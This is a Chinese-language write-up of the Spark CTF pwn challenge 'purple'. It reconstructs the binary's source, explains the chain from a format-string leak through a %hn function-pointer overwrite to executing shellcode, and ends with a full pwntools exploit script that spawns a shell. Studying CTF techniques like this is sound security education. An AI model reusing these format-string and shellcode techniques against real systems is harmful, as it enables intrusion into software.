# 分析：老东西，你的替身是最没用哒！(purple)

> Spark CTF / pwn。附件给了 `purple`、`libc.so.6`、`ld-linux-x86-64.so.2`（Debian 12 / glibc 2.36-9+deb12u14）。
> 二进制带完整调试信息（`-g -O0`），所以可以直接把源码几乎原样还原出来，不用硬啃汇编。

---

## 1. 基本信息与保护

```
$ file purple
ELF 64-bit LSB executable, x86-64, dynamically linked
$ checksec
Arch:     amd64-64-little
RELRO:    Full RELRO      ← GOT 只读, 不能改 GOT
Stack:    Canary found    ← 必须泄漏 canary
NX:       NX enabled
PIE:      No PIE (0x400000)
```

| 段 | 地址 | 说明 |
|---|---|---|
| `.text` | `0x4010d0` | 入口 |
| `shell_area` | `0x406000` | 全局 `char[1024]`，4K 对齐，**mprotect 三段式** |
| `_end` | `0x406400` | bss 结尾 |

导入函数很少：`read / printf / puts / putchar / setvbuf / mprotect / perror / exit`。
**没有 `seccomp`、没有 `system`**，所以拿到代码执行后直接 `execve("/bin/sh")` 即可。

## 2. 还原源码

调试信息里函数名、局部变量名、行号都在（`demo.c`），结合反汇编可以还原成：

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>

char shell_area[1024] __attribute__((aligned(4096)));        /* demo.c:13  → 0x406000 */

void paper_jam(void) {                                        /* demo.c:9   → 0x4011b6 */
    puts("念写终端没有识别这份稿件");
}

static void protect_shell_area(int prot) {                    /* demo.c:15  → 0x4011c7 */
    uintptr_t page = (uintptr_t)shell_area & ~0xfffUL;        /* 页对齐到 0x406000 */
    if (mprotect((void *)page, 0x1000, prot) != 0) {
        perror("mprotect");
        exit(1);
    }
}

int read_exact(unsigned char *dst, size_t length) {           /* demo.c:24  → 0x401210 */
    size_t received = 0;
    while (received < length) {
        ssize_t n = read(0, dst + received, length - received);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) return -1;
        received += n;
    }
    return 0;
}

void sign_note(void) {                                        /* demo.c:40  → 0x40128e */
    unsigned char note[64];                                   /* rbp-0x50 */
    puts("最后请交回签名页：");
    if (read_exact(note, 80) != 0) exit(0);                    /* ← 64 的缓冲区读 80 字节 */
}

int main(void) {                                              /* demo.c:51  → 0x4012e5 */
    char format[512];                                         /* rbp-0x210 */
    volatile void (*print_job)(void) = paper_jam;             /* rbp-0x220  ← "替身" */
    ssize_t n;

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin,  NULL, _IONBF, 0);
    puts("隐者之紫正在寻找目标……");
    puts("第一句：");

    protect_shell_area(PROT_READ);                            /* 1：把 shell_area 设成只读 */
    n = read(0, format, 511);
    if (n <= 0) return 0;
    format[n] = 0;
    printf(format, format, 0x41);        /* ① 格式化字符串, arg1 = format 指针 */
    putchar('\n');

    puts("第二句：");
    n = read(0, format, 511);
    if (n <= 0) return 0;
    format[n] = 0;
    printf(format, format, 0x41);        /* ② 同一个漏洞, 第二次机会 */
    putchar('\n');

    puts("请写入你要显现的内容：");
    protect_shell_area(PROT_READ | PROT_WRITE);               /* 3：RW */
    if (read_exact(shell_area, 1024) != 0) return 0;          /* ③ 往 shell_area 读 0x400 */
    protect_shell_area(PROT_READ | PROT_EXEC);                /* 5：R-X */

    sign_note();                                              /* ④ 越界 16 字节 */
    print_job();                                              /* ⑤ call rax —— 就是题目说的"替身" */
    return 0;
}
```

几个只会出现在反汇编里的细节：

* `0x4012ff: mov QWORD PTR [rbp-0x220], 0x4011b6` —— 这就是 `print_job = paper_jam`，`volatile` 让它的值每次从栈上重新读。
* `0x401495: mov rax,[rbp-0x220]` / `0x40149c: call rax` —— 结尾无条件跳到这个函数指针。
* `printf` 之前有 `xor eax,eax`（`mov eax,0`），所以没有使用向量寄存器参数。
* `read(0, format, 511)` 之后 `format[n]=0`；`n<=0` 直接 `return 0`。

### main 的栈帧

```
rbp+0x8   返回地址
rbp+0x0   saved rbp                ← 属于 __libc_start_call_main
rbp-0x8   canary                   = format + 0x208
rbp-0x10  (对齐空洞 8 字节)
rbp-0x210 char format[512]         ← printf 的 format && arg1
rbp-0x218 ssize_t n
rbp-0x220 void (*print_job)(void)  ← "替身"，初始 0x4011b6
        rsp = rbp-0x220            ← 调用 printf 时的 rsp
rbp-0x228 调用 printf 时压入的返回地址
```

## 3. 三个漏洞点拼成一条链

### ① 格式化字符串（`printf(format, format, 0x41)`）

`format` 既是格式化串又是第一个可变参数。它带来两件事：

* **泄漏**：`%1$p` 直接泄漏 `format` 的栈地址（也就是 `rbp-0x210`），`%73$p` 泄漏 canary；
* **任意地址写**：`%n / %hn` 配合写在 `format` 里的目标地址。

**可变参数索引表**（关键，位置参数在 x86-64 SysV 下的对应关系）：

| 索引 | 来源 | 值 |
|---|---|---|
| 1 | `rsi` | `format` 指针 = `rbp-0x210` |
| 2 | `rdx` | `0x41` |
| 3 | `rcx` | `format` 指针 |
| 4、5 | `r8`、`r9` | 残留值 |
| **6** | `[rbp-0x220]` | `print_job` = `0x4011b6` |
| 7 | `[rbp-0x218]` | `n` |
| 8 | `format[0..7]` | 自己写的内容 |
| 9 | `format[8..15]` | 自己写的内容 |
| … | … | … |
| **73** | `format[0x208..0x20f]` = `[rbp-0x8]` | **canary** |

为什么 `arg6` 正好是 `[rbp-0x220]`：`printf` 是变参函数，`va_start` 的 `overflow_arg_area`
指向"第一个栈上参数"，也就是调用点的 `rsp`。`main` 里 `sub rsp,0x220` 后 `rsp = rbp-0x220`，
而 `print_job` 恰好就躺在这个地址上，于是它变成第 6 个可变参数——这算是本题最漂亮的一个巧合。

`arg8` 之后读的是 `format[]` 自己的内容，所以只要把目标地址按 8 字节对齐写进 `format`，
它的索引就是 `8 + offset/8`。

### ② `shell_area` 的三段 mprotect

```
prot=1 (R)   →  read 两句格式化串
prot=3 (RW)  →  read_exact(shell_area, 0x400)   写 shellcode
prot=5 (R-X) →  执行
```

先 `PROT_READ` 是防着你在格式化串阶段写它；最后 `PROT_EXEC` 让它变成只读可执行。
因为**没有 PIE**，`shell_area` 的地址永远是 `0x406000`，所以 shellcode 位置完全可预测。

### ③ `sign_note` 的 16 字节越界

```c
unsigned char note[64];      // rbp-0x50
read_exact(note, 80);        // 0x50 字节 → 覆盖 [rbp-0x50, rbp-1]
```

写成布局（注意：这里很容易算错一格）：

```
offset  0x00..0x3f : note[64]                          rbp-0x50 .. rbp-0x11
offset  0x40..0x47 : 编译器留的空洞(没用, 随便填)        rbp-0x10 .. rbp-0x09
offset  0x48..0x4f : canary       ← 唯一要填真值的地方    rbp-0x08 .. rbp-0x01
                     saved rbp    ← 在 rbp+0, 写!不!到!
                     返回地址     ← 在 rbp+0x8, 更写不到
```

80 = 64(note) + 8(空洞) + 8(canary)，写入区间正好停在 `rbp-1`。
所以**只需要 canary 是真值**，`main` 的 saved rbp 根本没被动过（这点很容易误判成"要还原 rbp"，
实际 `read_exact` 的 80 字节到不了 `rbp+0`）：

* canary 错了 → `__stack_chk_fail` → `exit`，所以 canary 必须泄漏；
* 返回地址、saved rbp 都碰不到 → 不需要 rbp 泄漏，也不需要栈地址。

也就是说，这一关只要「一个 canary」。而第一个 `printf` 一个 `%73$p` 就把它交出来了。

## 4. 利用流程

```
   ┌ 第一句: %1$p|%6$p|%7$p|%8$p|%9$p|%70$p ... %78$p
   │   → &format (= rbp-0x210)      → rbp = &format+0x210
   │   → arg6 == 0x4011b6 自检      → 确认索引表没错
   │   → arg8 == u64("%1$p|%6")     → 确认 format[0] 的索引
   │   → arg73 = canary (末字节为 0x00)
   │
   ├ 第二句: %1$64c%12$hn%1$24512c%13$hn + 对齐填充 + p64(目标+2) + p64(目标)
   │   目标 = &print_job = &format - 0x10
   │   先写 0x0040 到 +2 字节(打印 64 字符), 再写 0x6000 到低 2 字节(累计 24576 字符)
   │   → print_job: 0x004011b6 → 0x00406000 = shell_area
   │
   ├ 请写入你要显现的内容: 0x400 字节 shellcode (execve("/bin/sh"))
   │
   ├ 最后请交回签名页: 72 个填充 + p64(canary)              ← 80 字节, 通过 canary 校验
   │   (80 字节只写到 rbp-1, saved rbp / 返回地址都碰不到)
   │
   └ main: call [rbp-0x220] → 0x406000 → execve("/bin/sh")
```

几点必须踩准的地方：

1. **只写 16 位 ×2，不要用 `%n` 写 4 字节**：`0x00406000 = 4218880`，`%n` 要打印 4.2MB；
   用 `%hn` 拆成 `0x0040`(64) 与 `0x6000`(24576) 两段，总输出才 24KB。
   `printf` 的计数是**累计**的，所以两段必须按值递增的顺序写（先小后大）。
2. **目标地址放在格式化串后面**：栈地址是 `0x7ffc...`，直接摆在开头有可能碰上 `%`(0x25)/NUL，
   被 `printf` 当成格式符或被截断。放末尾 + 8 字节对齐最稳。
3. **索引要自适应**：把 `format[0..7]` 的期望值算出来去比对 `%7$p/%8$p/%9$p`，
   哪个相等，`format[0]` 的索引就是哪个（正常是 8）。
4. **时序**：`stdin` 是 `_IONBF`，`main` 用的是裸 `read(0, format, 511)`，一次会吃掉当下所有可读字节。
   所以必须"等提示 → 发一条"，不能把所有 payload 一次性灌进去（否则后两段会被第一个 `read` 吞掉）。
   `read_exact` 是循环读到满，所以 shellcode 必须正好 0x400 字节，多一个字节就会串到 `sign_note` 里。
5. `format` 后面还有 `putchar('\n')`，泄漏行以 `\n` 结尾，按行解析即可。
6. Full RELRO 意味着改 GOT 是死路，改栈上的函数指针才是本题设计好的路。

## 5. exp

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spark pwn - purple  (老东西，你的替身是最没用哒！)"""
import os

from pwn import *

context.arch = "amd64"
context.log_level = "info"
context.timeout = 10

HERE = os.path.dirname(os.path.abspath(__file__))

SHELL_AREA = 0x406000
FMT_FROM_RBP = 0x210      # char format[512]      @ rbp-0x210
JOB_FROM_RBP = 0x220      # print_job             @ rbp-0x220
CANARY_FROM_BUF = FMT_FROM_RBP - 0x8
JOB_TO_BUF = JOB_FROM_RBP - FMT_FROM_RBP          # 0x10
DEFAULT_BUF_IDX = 8       # format[0..7] 是第 8 个可变参数

PROMPT_1 = "第一句：".encode()
PROMPT_2 = "第二句：".encode()
PROMPT_3 = "请写入你要显现的内容：".encode()
PROMPT_SIG = "最后请交回签名页：".encode()

# 1=format指针 6=print_job 7=n 8/9=format[0..15] 70..78=canary 附近
LEAK_IDXS = [1, 6, 7, 8, 9] + list(range(70, 79))


def build_stage1():
    return b"|".join(b"%%%d$p" % i for i in LEAK_IDXS)


def build_stage2(buf_addr, buf_idx=DEFAULT_BUF_IDX):
    """把 print_job 写成 SHELL_AREA: 0x004011b6 -> 0x00406000"""
    job_addr = buf_addr - JOB_TO_BUF
    lo_addr, hi_addr = job_addr, job_addr + 2
    lo_val = SHELL_AREA & 0xFFFF            # 0x6000
    hi_val = (SHELL_AREA >> 16) & 0xFFFF    # 0x0040
    i_hi = i_lo = buf_idx
    for _ in range(16):
        body = b"%%1$%dc%%%d$hn" % (hi_val, i_hi)          # 打印 64 字符 → 写 0x0040
        body += b"%%1$%dc%%%d$hn" % (lo_val - hi_val, i_lo)  # 再打印 0x5fc0 → 写 0x6000
        body += b"A" * ((-len(body)) % 8)                    # 8 字节对齐
        off_hi = len(body)
        n_hi = buf_idx + off_hi // 8
        n_lo = buf_idx + (off_hi + 8) // 8
        if (n_hi, n_lo) == (i_hi, i_lo):
            break
        i_hi, i_lo = n_hi, n_lo
    return body + p64(hi_addr) + p64(lo_addr), job_addr, (i_hi, i_lo)


def build_payload_bytes(flag_path=None):
    if flag_path:
        return asm(
            shellcraft.amd64.linux.open(flag_path, 0)
            + shellcraft.amd64.linux.read("rax", "rsp", 0x100)
            + shellcraft.amd64.linux.write(1, "rsp", 0x100)
        )
    return asm(shellcraft.amd64.linux.sh())


def parse_leak(line, s1):
    vals = [int(x, 16) for x in line.split(b"|")]
    table = dict(zip(LEAK_IDXS, vals))
    buf_addr = table[1]
    word0 = u64(s1[:8].ljust(8, b"\x00"))
    buf_idx = DEFAULT_BUF_IDX
    for i in (8, 7, 9, 6):
        if table.get(i) == word0:
            buf_idx = i
            log.success("format[0] 是第 %d 个可变参数", buf_idx)
            break
    if table.get(6) == 0x4011B6:
        log.success("arg6 == print_job(0x4011b6), 栈布局确认")
    canary_idx = buf_idx + CANARY_FROM_BUF // 8
    canary = table.get(canary_idx)
    if canary is None or canary & 0xFF:
        cand = [v for k, v in table.items() if k >= buf_idx + 55 and (v & 0xFF) == 0]
        if not cand:
            raise RuntimeError("canary not found")
        canary = cand[0]
    return buf_addr, buf_idx, canary


def start():
    if args.REMOTE:
        host, port = args.REMOTE.split(":")
        return remote(host, int(port))
    ld = os.path.join(HERE, "ld-linux-x86-64.so.2")
    exe = [ld, "--library-path", HERE, os.path.join(HERE, "purple")]
    return process(exe, cwd=HERE)


def exploit(io):
    # ① 泄漏 &format / canary
    s1 = build_stage1()
    io.recvuntil(PROMPT_1)
    io.sendline(s1)
    while True:
        line = io.recvline()
        if line.startswith(b"0x") and b"|" in line:
            break
    log.info("leak %s", line.strip().decode("latin-1"))
    buf_addr, buf_idx, canary = parse_leak(line.strip(), s1)
    main_rbp = buf_addr + FMT_FROM_RBP
    log.success("&format=%#x main_rbp=%#x canary=%#x", buf_addr, main_rbp, canary)

    # ② 改写 print_job
    io.recvuntil(PROMPT_2)
    payload, job_addr, idxs = build_stage2(buf_addr, buf_idx)
    log.info("write [%#x] <- %#x via args %s", job_addr, SHELL_AREA, idxs)
    io.sendline(payload)
    io.recvuntil(PROMPT_3)                 # 顺便吃掉 24KB 的 %c 输出
    log.success("print_job -> shell_area")

    # ③ shellcode
    sc = build_payload_bytes(args.ORW or None)
    io.send(sc.ljust(1024, b"\x90"))
    log.success("%d bytes of code at %#x", len(sc), SHELL_AREA)

    # ④ canary: 72 填充 + p64(canary)  (80 字节, 只写到 rbp-1)
    io.recvuntil(PROMPT_SIG)
    io.send(b"A" * 72 + p64(canary))

    # ⑤ shell
    if args.ORW:
        print(io.recvrepeat(2).decode("latin-1"))
        return
    io.sendline(b"echo PWNED_$((1+1))")
    io.recvuntil(b"PWNED_2", timeout=5)
    io.interactive()


if __name__ == "__main__":
    exploit(start())
```

## 6. 一点题外话（彩蛋）

* `purple` / "隐者之紫" = 乔瑟夫·乔斯达的替身 **Hermit Purple**，能力是"念写"（拍出目标的照片）；
  `paper_jam` 念出的结果是"念写终端没有识别这份稿件"（打印机卡纸）；
  DIO 那句"老东西，你的替身是最没用哒！"就是嘲笑这个替身。
* 题面"替身"在程序里就是 `print_job` 这个函数指针：它调用前不做任何检查（`call rax`），
  初始指向只会打印一句话的 `paper_jam`——确实"最没用"。真正有用的东西被 `mprotect`
  藏成了 RWX 的 `shell_area`（"隐藏真正的攻击目标"），我们只是把替身换了个指向。

## 7. 小结

| 环节 | 手段 |
|---|---|
| 泄漏栈地址 / canary | `printf(format, format, 0x41)` 的格式化字符串，`%1$p` + `%73$p` |
| 任意地址写 | `%hn` 两次，把 `0x004011b6` 改成 `0x00406000`（写栈上的 `print_job`） |
| 代码注入 | `shell_area` 三段 `mprotect`（R→RW→R-X），非 PIE 固定地址 |
| 绕过 canary | 只要泄漏到的 canary（后 8 字节），`sign_note` 越界 80 字节正好停在 rbp-1 |
| 控制流劫持 | `main` 结尾 `call [rbp-0x220]` |

## 8. 备注：关于验证

这台机器是 Windows，且没有可用的 Linux 运行时（WSL 服务不可访问、Docker daemon 没起来、也没有 qemu-user），
所以 **`exp.py` 没有在本地实跑**，只有静态分析 + 离线校验：

* 栈帧/索引推导全部来自反汇编与 SysV ABI（`main` 调用 `printf` 时 `rsp = rbp-0x220`，
  变参溢出区第一个槽就是 `[rbp-0x220]`，即 `print_job`）；
* 载荷构造（位置参数索引自洽、`%hn` 顺序、累计计数、写入的最终值）用一个离线模拟器
  按 glibc 位置参数规则跑过：`%1$64c%12$hn%1$24512c%13$hnAAAAA` + 两个地址、
  输出 24587 字节、`print_job` 从 `0x4011b6` 变成 `0x406000`、高 4 字节保持 0；
* `exp.py` 里内置了两条运行期自检，跑起来会打印：

  ```
  [+] format[0] 是第 8 个可变参数
  [+] arg6 == print_job(0x4011b6), 栈布局确认
  [+] &format=0x7ffc... canary=0x...00
  [+] print_job -> shell_area
  ```

  两条 `[+]` 都出来了就说明索引表和栈布局和本文推导一致；万一是别的 glibc/编译方式，
  `format[0]` 的索引会在 `%6..%9$p` 里自动识别（canary 索引跟着平移），不用改脚本。

如果实跑时卡在第一步（泄漏行不是 `0x...|0x...`），基本就是时序问题：
`stdin` 无缓冲 + 裸 `read(0, format, 511)`，必须等提示符出现再发，别一次性 `send` 全部数据。
